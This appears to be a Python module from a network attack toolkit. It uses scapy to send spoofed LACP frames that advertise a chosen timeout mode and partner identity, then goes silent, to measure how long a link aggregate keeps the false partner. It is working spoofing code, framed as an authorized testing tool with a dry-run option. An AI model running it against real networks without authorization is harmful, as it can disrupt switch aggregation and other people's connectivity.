"""LAG misconfiguration abuse: advertise an LACP timeout that does not match the aggregate's rate.

LACP has two timeout modes. A short timeout (the Timeout bit set in the actor state) means the
partner sends LACPDUs every second and is expired after about three seconds of silence. A long
timeout (the bit clear) means it sends every 30 seconds and is expired after about 90 seconds.
The two ends of an aggregate must agree on the mode. A device that advertises a mode it does not
follow, or an end that accepts a mode the other end does not use, leaves the aggregate with a
partner state that is wrong for how the link really behaves.

This module sends LACPDUs from the operator's port with the timeout mode the operator chooses,
then goes silent. The effect to measure is how long the aggregate keeps the claimed partner after
the last LACPDU: a short timeout should expire in seconds, and a long timeout that the aggregate
honours keeps the partner for much longer.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac
from macabre.attacks.lacp_spoofing import MAX_FRAMES, MAX_KEY, MAX_PRIORITY, build_lacpdu

# Actor state without the Timeout bit (0x02): Activity, Aggregation, Synchronization,
# Collecting and Distributing. This is the long timeout mode.
LONG_TIMEOUT_STATE = 0x3D
# The same state with the Timeout bit set: the short timeout mode.
SHORT_TIMEOUT_STATE = 0x3F
TIMEOUT_MODES = ("long", "short")
MIN_INTERVAL = 0.5  # seconds; LACP's fast rate is one LACPDU per second


def timeout_state(timeout: str) -> int:
    """Actor state for a timeout mode: "long" clears the Timeout bit, "short" sets it."""
    if timeout == "long":
        return LONG_TIMEOUT_STATE
    if timeout == "short":
        return SHORT_TIMEOUT_STATE
    raise ValueError(f"Timeout must be one of: {', '.join(TIMEOUT_MODES)}.")


@dataclass(frozen=True)
class LagMisconfigurationConfig:
    iface: str                          # attacker interface, on the link to the aggregate under test
    system_mac: str = ""                # actor system ID claimed; empty = a random MAC for the run
    key: int = 1                        # actor key claimed
    port_number: int = 1                # actor port number claimed
    system_priority: int = 32768        # actor system priority claimed
    port_priority: int = 128            # actor port priority claimed
    timeout: str = "long"               # timeout mode claimed: "long" or "short"
    frames: int = 3                     # LACPDUs to send in total, then the attacker stops
    interval: float = 1.0               # seconds between LACPDUs
    dry_run: bool = False               # build LACPDUs but do not send them

    def __post_init__(self) -> None:
        if self.system_mac:
            normalize_unicast_mac(self.system_mac)
        for name, value, limit in (
            ("Key", self.key, MAX_KEY),
            ("Port number", self.port_number, MAX_KEY),
            ("System priority", self.system_priority, MAX_PRIORITY),
            ("Port priority", self.port_priority, MAX_PRIORITY),
        ):
            if not 0 <= value <= limit:
                raise ValueError(f"{name} must be between 0 and {limit}.")
        timeout_state(self.timeout)  # raises for an unknown mode
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")
        if self.interval < MIN_INTERVAL:
            raise ValueError(f"Interval must be at least {MIN_INTERVAL} s.")


@dataclass
class LagMisconfigurationStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def run_lag_misconfiguration(
    config: LagMisconfigurationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LagMisconfigurationStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> LagMisconfigurationStats:
    """Send `frames` LACPDUs with the claimed timeout mode, one every `interval` seconds, then stop."""
    rng = rng or random.Random()
    send = send or sendp
    sender = config.system_mac or random_mac(rng)
    state = timeout_state(config.timeout)

    if config.dry_run:
        stats = LagMisconfigurationStats(
            sender_mac=sender,
            status=(
                f"Dry run: would send {config.frames} LACPDU(s) claiming system {sender}, key {config.key}, "
                f"port {config.port_number}, {config.timeout} timeout (state 0x{state:02X}). Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frame: Packet = build_lacpdu(sender, config.key, config.port_number, config.system_priority,
                                 config.port_priority, state)
    stats = LagMisconfigurationStats(sender_mac=sender)
    for _ in range(config.frames):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if stop_event.wait(config.interval):
            break
    return stats
